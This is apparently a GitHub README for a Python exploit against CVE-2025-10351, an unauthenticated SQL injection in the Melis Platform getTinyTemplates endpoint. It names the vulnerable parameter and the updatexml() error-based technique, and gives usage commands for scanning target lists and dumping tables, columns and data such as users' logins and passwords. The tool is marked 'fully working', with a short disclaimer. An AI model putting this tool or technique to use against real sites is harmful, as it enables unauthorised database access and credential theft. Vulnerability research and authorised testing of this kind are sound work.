# CVE-2025-10351 - SQL Injection Exploit üß®

> Exploit for CVE-2025-10351: An unauthenticated SQL Injection vulnerability that affects a specific endpoint in Melis Platform Framework.

![status](https://img.shields.io/badge/status-fully%20working-brightgreen)
![python](https://img.shields.io/badge/python-3.8%2B-blue)

---

## üîó References

- üìÑ [CVE on INCIBE (Spanish National Cybersecurity Institute)](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2025-10351)
- üìÑ [Melis Platform Warning on INCIBE (Spanish National Cybersecurity Institute)](https://www.incibe.es/incibe-cert/alerta-temprana/avisos/multiples-vulnerabilidades-en-melis-platform)

---

## üöÄ Description

This exploit targets an **unauthenticated error-based SQL injection** vulnerability in the endpoint:

```
melis/MelisCms/PageEdition/getTinyTemplates?idPage=
```

It leverages `updatexml()` in MySQL to extract:

- Table names
- Column names
- Data from specific or all columns

It also detects possible **time-based SQLi** vectors for further manual exploitation.

---

## üõ†Ô∏è Requirements

Install dependencies with:

```bash
pip3 install -r requirements.txt
```

---

## üß™ Usage

### Basic check
```bash
python3 CVE-2025-10351.py -u http://target.com -p 80
```

### From URL list
```bash
python3 CVE-2025-10351.py -l targets.txt
```

### Extract all table names
```bash
python3 CVE-2025-10351.py -u http://target.com -p 80 -at
```

### Extract all column names from a table
```bash
python3 CVE-2025-10351.py -u http://target.com -p 80 -t users
```

### Extract all data from all columns
```bash
python3 CVE-2025-10351.py -u http://target.com -p 80 -t users -ac
```

### Extract specific columns
```bash
python3 CVE-2025-10351.py -u http://target.com -p 80 -t users -c user,login,password
```

### Using proxy with insecure mode, cookies and debug mode
```bash
python3 CVE-2025-10351.py -u http://target.com -p 80 -t users -c user,login,password --proxy http://127.0.0.1:8080 --insecure --cookies 2prkpe1h72nd4fhmlum65okc04 --debug
```

---

## ‚öôÔ∏è Options

| Argument     | Description                             |
|--------------|-----------------------------------------|
| `-u`         | Target URL                               |
| `-p`         | Port (80, 443, etc.)                     |
| `-l`         | File containing list of URLs             |
| `-s`         | Sleep time for time-based tests (default: 1s) |
| `-at`        | Dump all table names                     |
| `-t`         | Specify table name                       |
| `-ac`        | Dump all columns of given table          |
| `-c`         | Comma-separated list of columns to dump  |
| `--proxy`         | Burp Proxy http://127.0.0.1:8080 |
| `--insecure`         | Disable TLS checks when using proxy connections |
| `--cookie`         | Cookies for auth requests  |
| `--debug`         | Debug mode |
---

## üì§ Output

- Extracted tables saved to `tables_extracted.txt`
- Extracted data saved to `<table_name>_data.txt`

---

## ‚ö†Ô∏è Disclaimer

This script is for educational purposes only. Use it only on systems you have explicit permission to test. The author is not responsible for any misuse or damage caused.

---

Made with ‚ù§Ô∏è by Manuel Iv√°n San Mart√≠n Castillo
